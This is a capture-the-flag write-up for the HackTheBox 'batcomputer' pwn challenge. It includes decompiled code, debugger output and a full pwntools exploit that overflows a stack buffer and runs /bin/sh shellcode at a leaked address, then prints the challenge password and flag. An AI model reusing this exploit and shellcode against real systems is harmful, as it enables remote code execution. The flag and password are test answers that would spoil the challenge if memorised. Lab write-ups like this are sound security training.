---
Category:
  - Pwn
Difficulty: Easy
Platform: HackTheBox
Status: 3. Complete
tags: [PIE, code-review, leaking-stack, reversing]
---
>[!quote]
> It's your time to save the world!


# Set up

No setup required

# Information Gathering

Binary information and protections:

```bash
┌──(maoutis㉿kali)-[~/CTF/HTB/Pwn/batcomputer]
└─$ file batcomputer
batcomputer: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=497abb33ba7b0370d501f173facc947759aa4e22, for GNU/Linux 3.2.0, stripped

┌──(maoutis㉿kali)-[~/CTF/HTB/Pwn/batcomputer]
└─$ checksec --file=batcomputer
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX disabled   PIE enabled     No RPATH   No RUNPATH   No Symbols        No    0               3               batcomputer
```

Binary execution:

```bash
┌──(maoutis㉿kali)-[~/CTF/HTB/Pwn/batcomputer]
└─$ ./batcomputer
Welcome to your BatComputer, Batman. What would you like to do?
1. Track Joker
2. Chase Joker
> 1
It was very hard, but Alfred managed to locate him: 0x7ffd811cc004
Welcome to your BatComputer, Batman. What would you like to do?
1. Track Joker
2. Chase Joker
> 2
Ok. Let's do this. Enter the password: test
The password is wrong.
I can't give you access to the BatMobile!
```

## Decompiled source code

- **main.c**
    
    ```c
    undefined8 main(void)
    
    {
      int isEqual;
      int menu;
      char password [16];
      undefined navCmd [76];
      
      setup();
      while( true ) {
        while( true ) {
          memset(password,0,0x10);
          printf(
                "Welcome to your BatComputer, Batman. What would you like to do?\n1. Track Joker\n2.Chase Joker\n> "
                );
          __isoc99_scanf(&DAT_00102069,&menu);
          if (menu != 1) break;
          printf("It was very hard, but Alfred managed to locate him: %p\n",navCmd);
        }
        if (menu != 2) break;
        printf("Ok. Let\'s do this. Enter the password: ");
        __isoc99_scanf(&DAT_001020d0,password);
        isEqual = strcmp(password,"b4tp@$$w0rd!");
        if (isEqual != 0) {
          puts("The password is wrong.\nI can\'t give you access to the BatMobile!");
                        /* WARNING: Subroutine does not return */
          exit(0);
        }
        printf("Access Granted. \nEnter the navigation commands: ");
        read(0,navCmd,0x89);
        puts("Roger that!");
      }
      puts("Too bad, now who\'s gonna save Gotham? Alfred?");
      return 0;
    }
    ```
    

# The Bug - Buffer Overflow

`read(0,navCmd,0x89);` read 137 bytes, however navCmd has only 76 bytes allocated, so it is possible to overwrite stuff on the stack. To perform a return, it is possible to provide to `menu` a value different from 1 and 2, forcing the program to return to arbitrary code.

# Exploitation

Generate and calculated the overflow offset:

```bash
┌──(maoutis㉿kali)-[~/CTF/HTB/Pwn/batcomputer]
└─$ msf-pattern_create -l 125
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae

┌──(maoutis㉿kali)-[~/CTF/HTB/Pwn/batcomputer]
└─$ gdb -q batcomputer
...
pwndbg> 2
...
pwndbg> b4tp@$$w0rd!
...
pwndbg> Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae
...
RBP  0x3763413663413563 ('c5Ac6Ac7')
RSP  0x7fffffffde58 ◂— 'Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae\nUUUU'
RIP  0x55555555531f ◂— ret

┌──(maoutis㉿kali)-[~/CTF/HTB/Pwn/batcomputer]
└─$ msf-pattern_offset -l 125 -q 0x3763413663413563
[*] Exact match at offset 76
```

Final exploit:

```python
#!/usr/bin/python3
from pwn import *
import sys

password = 'b4tp@$$w0rd!'
crash = 125
offset = 84
ret_addr = b""

shellcode  = b"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05" # /bin/sh

nop_sled = b'\x90' * 8
filler = b"\x43" * (offset - len(shellcode) - len(nop_sled))
junk = b"\x41" * (crash - len(nop_sled) - len(shellcode) - len(filler) - 8  )

f = open("payload","wb")
p = process('./batcomputer')
p = remote("46.101.27.51",30934)

p.recvuntil(b"> ", timeout=1)
p.sendline(b'1')
p.recvuntil(b": ", timeout=1)

# Starting address for the navCmd array  
navCmd_addr = p.recvuntil(b"\n").strip()
ret_addr = int(navCmd_addr.decode(), 16)
print(f"[DEBUG] ret_addr: {hex(ret_addr)}")

p.recvuntil(b"> ", timeout=1)
p.sendline(b'2')
p.recvuntil(b": ", timeout=1)
p.sendline(password.encode())
p.recvuntil(b": ", timeout=1)

payload = nop_sled + shellcode + filler + p64(ret_addr) + junk

print(f"[DEBUG] Payload len: {len(payload)}")
print(f"[DEBUG] Payload: { payload.decode('latin-1') }")

p.sendline(payload)
f.write(payload)

p.recvuntil(b"> ", timeout=1)
p.sendline(b'3')
p.interactive()
```

```bash
┌──(maoutis㉿kali)-[~/CTF/HTB/Pwn/batcomputer]
└─$ python3 exploit2.py
[+] Starting local process './batcomputer': pid 135293
[+] Opening connection to 46.101.27.51 on port 30934: Done
[DEBUG] ret_addr: 0x7ffe55b3d4c4
[DEBUG] Payload len: 125
[DEBUG] Payload: PH1ÒH1öH»/bin//shST_°;\x0fCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCÄÔ³Uþ\x7f\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[*] Switching to interactive mode
Too bad, now who's gonna save Gotham? Alfred?
$ id
uid=0(root) gid=0(root) groups=0(root)
$ ls
batcomputer
flag.txt
$ cat flag.txt
HTB{l0v3_y0uR_sh3llf_U_s4v3d_th3_w0rld!}
```

# Flag

>[!success]
>`HTB{l0v3_y0uR_sh3llf_U_s4v3d_th3_w0rld!}`

